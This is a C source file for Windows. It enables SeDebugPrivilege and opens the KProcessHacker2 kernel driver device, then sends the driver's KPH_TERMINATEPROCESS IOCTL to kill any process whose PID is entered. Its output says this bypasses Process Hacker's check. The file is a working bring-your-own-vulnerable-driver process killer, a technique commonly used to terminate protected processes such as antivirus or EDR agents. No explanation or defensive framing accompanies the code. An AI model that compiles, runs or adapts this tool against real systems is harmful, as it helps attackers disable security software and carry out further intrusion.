#include <Windows.h>
#include <stdio.h>

// https://processhacker.sourceforge.io/doc/kphapi_8h.html

#define 	KPH_DEVICE_TYPE   0x9999
#define 	KPH_DYN_CONFIGURATION_VERSION   2
#define 	KPH_DYN_MAXIMUM_PACKAGES   64
#define 	KPH_CTL_CODE(x)   CTL_CODE(KPH_DEVICE_TYPE, 0x800 + x, METHOD_NEITHER, FILE_ANY_ACCESS)
#define 	KPH_GETFEATURES   KPH_CTL_CODE(0)
#define 	KPH_OPENPROCESS   KPH_CTL_CODE(50)
#define 	KPH_OPENPROCESSTOKEN   KPH_CTL_CODE(51)
#define 	KPH_OPENPROCESSJOB   KPH_CTL_CODE(52)
#define 	KPH_SUSPENDPROCESS   KPH_CTL_CODE(53)
#define 	KPH_RESUMEPROCESS   KPH_CTL_CODE(54)
#define 	KPH_TERMINATEPROCESS   KPH_CTL_CODE(55)
#define 	KPH_READVIRTUALMEMORY   KPH_CTL_CODE(56)
#define 	KPH_WRITEVIRTUALMEMORY   KPH_CTL_CODE(57)
#define 	KPH_READVIRTUALMEMORYUNSAFE   KPH_CTL_CODE(58)
#define 	KPH_QUERYINFORMATIONPROCESS   KPH_CTL_CODE(59)
#define 	KPH_SETINFORMATIONPROCESS   KPH_CTL_CODE(60)
#define 	KPH_OPENTHREAD   KPH_CTL_CODE(100)
#define 	KPH_OPENTHREADPROCESS   KPH_CTL_CODE(101)
#define 	KPH_TERMINATETHREAD   KPH_CTL_CODE(102)
#define 	KPH_TERMINATETHREADUNSAFE   KPH_CTL_CODE(103)
#define 	KPH_GETCONTEXTTHREAD   KPH_CTL_CODE(104)
#define 	KPH_SETCONTEXTTHREAD   KPH_CTL_CODE(105)
#define 	KPH_CAPTURESTACKBACKTRACETHREAD   KPH_CTL_CODE(106)
#define 	KPH_QUERYINFORMATIONTHREAD   KPH_CTL_CODE(107)
#define 	KPH_SETINFORMATIONTHREAD   KPH_CTL_CODE(108)
#define 	KPH_ENUMERATEPROCESSHANDLES   KPH_CTL_CODE(150)
#define 	KPH_QUERYINFORMATIONOBJECT   KPH_CTL_CODE(151)
#define 	KPH_SETINFORMATIONOBJECT   KPH_CTL_CODE(152)
#define 	KPH_DUPLICATEOBJECT   KPH_CTL_CODE(153)
#define 	KPH_OPENDRIVER   KPH_CTL_CODE(200)
#define 	KPH_QUERYINFORMATIONDRIVER   KPH_CTL_CODE(201)

BOOL SetPrivilege(
	HANDLE htoken,          // access token handle
	LPCTSTR lpszPrivilege  // name of privilege to enable/disab   // to enable or disable privilege
)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;

	if (!LookupPrivilegeValue(
		NULL,            // lookup privilege on local system
		lpszPrivilege,   // privilege to lookup 
		&luid))        // receives LUID of privilege
	{
		printf("LookupPrivilegeValue error: %u\n", GetLastError());
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;

	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;


	// Enable the privilege or disable all privileges.

	if (!AdjustTokenPrivileges(
		htoken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		printf("AdjustTokenPrivileges error: %u\n", GetLastError());
		return FALSE;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)

	{
		printf("The token does not have the specified privilege. \n");
		return FALSE;
	}

	return TRUE;
}

int wmain(
	void
)
{
	HANDLE token = 0;
	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &token);
	SetPrivilege(token, TEXT("SeDebugPrivilege"));
	printf("SeDebugPrivilege enabled to bypass process hacker check\n");

	int pid = 0;

	printf("Enter target process pid to kill : ");
	scanf_s("%d", &pid);
	DWORD processId = pid;  // Replace with the actual process ID

	HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
	if (processHandle != NULL) {
		printf("Handle to process %lu: %p\n", processId, processHandle);
	}
	else {
		printf("Failed to open handle to process %lu\n", processId);
		return (-1);
	}
	HANDLE ProcessHandle = processHandle;
	NTSTATUS ExitStatus = 0;

	struct {
		HANDLE ProcessHandle;
		NTSTATUS ExitStatus;
	} input = { ProcessHandle, ExitStatus };

	PVOID lpBytesReturned;

	HANDLE hdevice = CreateFile(L"\\\\.\\GlobalRoot\\Device\\KProcessHacker2", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

	if (hdevice == INVALID_HANDLE_VALUE)
	{
		printf("failed to open device\n");
		return (-1);
	}
	else
		printf("KProcessHacker2 driver device opened\n");

	if (DeviceIoControl(hdevice, KPH_TERMINATEPROCESS, (LPVOID)&input, sizeof(input), &lpBytesReturned, sizeof(lpBytesReturned), 0, NULL))
		printf("sending KPH_TERMINATEPROCESS IOCTL %x to the driver!\n", KPH_TERMINATEPROCESS);
	else
	{
		printf("Failed to send the IOCTL %x.\n", KPH_TERMINATEPROCESS);
		return (-1);
	}
	printf("process %d has been terminated successfully with status %d.\n", pid, ExitStatus);

	CloseHandle(hdevice);
	system("pause");
	return (0);
}
